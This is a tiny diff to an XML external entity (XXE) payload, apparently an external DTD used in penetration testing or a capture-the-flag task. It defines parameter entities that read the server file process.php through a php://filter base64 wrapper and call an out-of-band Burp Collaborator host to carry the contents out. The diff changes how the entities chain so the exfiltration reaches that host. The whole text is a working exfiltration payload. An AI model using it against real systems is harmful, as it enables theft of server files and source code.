@@ -1,3 +1,4 @@
 <!ENTITY % ccc SYSTEM "https://ccc.v2y42yl2wlqib3p8wx5a2ydcj3pydn.burpcollaborator.net?php://filter/convert.base64-encode/resource=process.php">
-<!ENTITY % ddd SYSTEM "https://bbb.v2y42yl2wlqib3p8wx5a2ydcj3pydn.burpcollaborator.net/?%ccc;">
+%ccc;
+<!ENTITY % ddd SYSTEM "https://bbb.v2y42yl2wlqib3p8wx5a2ydcj3pydn.burpcollaborator.net/">
 %ddd;
